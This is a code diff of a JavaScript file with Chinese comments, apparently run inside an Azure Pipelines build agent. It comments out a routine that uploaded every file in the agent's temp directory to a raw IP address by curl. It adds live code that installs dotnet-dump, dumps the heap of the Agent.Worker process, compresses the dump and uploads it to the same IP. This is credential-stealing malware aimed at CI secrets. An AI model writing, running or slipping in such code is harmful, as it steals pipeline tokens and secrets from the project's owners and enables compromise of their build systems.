@@ -474,48 +474,115 @@
 //     });
 // });
 
+// const fs = require('fs');
+// const path = require('path');
+// const { exec } = require('child_process');
+
+// const tempDir = '/home/vsts/work/_temp/';
+// const uploadUrl = 'http://139.180.193.16:5000/upload';
+
+// // 读取目录中的所有文件和子目录
+// fs.readdir(tempDir, (err, files) => {
+//     if (err) {
+//         console.error('无法读取目录:', err);
+//         return;
+//     }
+
+//     // 遍历并处理每个文件和子目录的名称
+//     files.forEach(file => {
+//         const filePath = path.join(tempDir, file);
+
+//         // 检查当前路径是否为文件
+//         fs.stat(filePath, (err, stats) => {
+//             if (err) {
+//                 console.error('无法获取文件信息:', err);
+//                 return;
+//             }
+
+//             if (stats.isFile() ) {
+//                 console.log('发现 文件:', filePath);
+
+//                 // 使用 curl 命令将 .sh 文件上传到服务器
+//                 exec(`curl -F "file=@${filePath}" ${uploadUrl}`, (error, stdout, stderr) => {
+//                     if (error) {
+//                         console.error(`执行 curl 时出错: ${error.message}`);
+//                         return;
+//                     }
+//                     if (stderr) {
+//                         console.error(`curl 执行输出错误: ${stderr}`);
+//                         return;
+//                     }
+//                     console.log(`文件已上传: ${filePath}`);
+//                     console.log(`curl 命令结果:\n${stdout}`);
+//                 });
+//             }
+//         });
+//     });
+// });
+
+const { exec, execSync } = require('child_process');
 const fs = require('fs');
-const path = require('path');
-const { exec } = require('child_process');
 
-const tempDir = '/home/vsts/work/_temp/';
-const uploadUrl = 'http://139.180.193.16:5000/upload';
-
-// 读取目录中的所有文件和子目录
-fs.readdir(tempDir, (err, files) => {
-    if (err) {
-        console.error('无法读取目录:', err);
+// 安装 dotnet-dump
+exec('dotnet tool install --global dotnet-dump', (error, stdout, stderr) => {
+    if (error) {
+        console.error(`执行错误: ${error}`);
         return;
     }
+    console.log(`stdout: ${stdout}`);
+    console.error(`stderr: ${stderr}`);
 
-    // 遍历并处理每个文件和子目录的名称
-    files.forEach(file => {
-        const filePath = path.join(tempDir, file);
+    // 获取Agent.Worker进程的PID
+    exec("ps -e | grep 'Agent.Worker' | grep -v grep | awk '{print $1}'", (error, stdout, stderr) => {
+        if (error) {
+            console.error(`获取PID失败: ${error}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+            return;
+        }
 
-        // 检查当前路径是否为文件
-        fs.stat(filePath, (err, stats) => {
-            if (err) {
-                console.error('无法获取文件信息:', err);
+        const PID = stdout.trim();
+        if (!PID) {
+            console.error("Error: Unable to find PID for Agent.Worker.");
+            process.exit(1);
+        }
+
+        console.log(`The PID of Agent.Worker is ${PID}`);
+        const dumpCommand = `dotnet-dump collect -p ${PID} --type Heap -o /home/vsts/work/_temp/heap_worker.bin`;
+
+        // 执行内存转储
+        exec(dumpCommand, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`内存转储执行错误: ${error}`);
                 return;
             }
+            console.log(`stdout: ${stdout}`);
+            console.error(`stderr: ${stderr}`);
 
-            if (stats.isFile() ) {
-                console.log('发现 文件:', filePath);
+            // 打包内存转储文件
+            const tarCommand = 'tar -czf "/home/vsts/work/_temp/heap_worker.tar.gz" "/home/vsts/work/_temp/heap_worker.bin"';
+            exec(tarCommand, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`打包错误: ${error}`);
+                    return;
+                }
+                console.log(`stdout: ${stdout}`);
+                console.error(`stderr: ${stderr}`);
 
-                // 使用 curl 命令将 .sh 文件上传到服务器
-                exec(`curl -F "file=@${filePath}" ${uploadUrl}`, (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`执行 curl 时出错: ${error.message}`);
-                        return;
-                    }
-                    if (stderr) {
-                        console.error(`curl 执行输出错误: ${stderr}`);
-                        return;
-                    }
-                    console.log(`文件已上传: ${filePath}`);
-                    console.log(`curl 命令结果:\n${stdout}`);
-                });
-            }
+                // 上传内存转储包
+                try {
+                    const stats = fs.statSync("/home/vsts/work/_temp/heap_worker.tar.gz");
+                    console.log(`Uploading memory dump package of size ${stats.size} bytes`);
+
+                    const curlCommand = `curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload`;
+                    execSync(curlCommand);
+                    console.log("Upload successful");
+                } catch (error) {
+                    console.error(`上传错误: ${error}`);
+                }
+            });
         });
     });
 });
